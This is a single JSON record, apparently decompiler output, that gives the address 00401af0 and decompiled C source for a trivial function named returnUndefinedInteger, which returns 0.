{"Function Name": "FUN_00401af0", "Address": "00401af0", "Source Code": "undefined8 returnUndefinedInteger(void)\n{\n    \n    return 0;\n}"}
